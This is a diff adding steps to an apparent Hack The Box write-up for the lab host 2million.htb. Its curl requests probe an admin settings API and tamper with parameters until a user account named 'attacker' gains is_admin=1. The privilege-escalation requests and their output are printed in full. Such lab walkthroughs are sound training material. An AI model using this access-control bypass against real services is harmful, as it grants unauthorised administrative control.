@@ -340,3 +340,36 @@ root@kali# curl -vvv -X PUT http://2million.htb/api/v1/admin/settings/update -H 
 }  
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/a4e618b3-96b5-43e4-8860-19e195cd62da)
+
+```shell
+> curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=dihm5b2fhtpggrecrhjnfm62h8" -H "Content-Type: application/json" | jq
+{
+  "status": "danger",
+  "message": "Missing parameter: email"
+}
+```
+
+```shell
+curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=dihm5b2fhtpggrecrhjnfm62h8" -H "Content-Type: application/json" -d '{"email":"root@pwnstuff.com"}' | jq
+{
+  "status": "danger",
+  "message": "Missing parameter: is_admin"
+}
+```
+
+```shell
+curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=dihm5b2fhtpggrecrhjnfm62h8" -H "Content-Type: application/json" -d '{"email":"root@pwnstuff.com", "is_admin":" "}' | jq
+{
+  "status": "danger",
+  "message": "Variable is_admin needs to be either 0 or 1."
+}
+```
+
+```shell
+curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=dihm5b2fhtpggrecrhjnfm62h8" -H "Content-Type: application/json" -d '{"email":"root@pwnstuff.com", "is_admin":1}' | jq
+{
+  "id": 13,
+  "username": "attacker",
+  "is_admin": 1
+}
+```
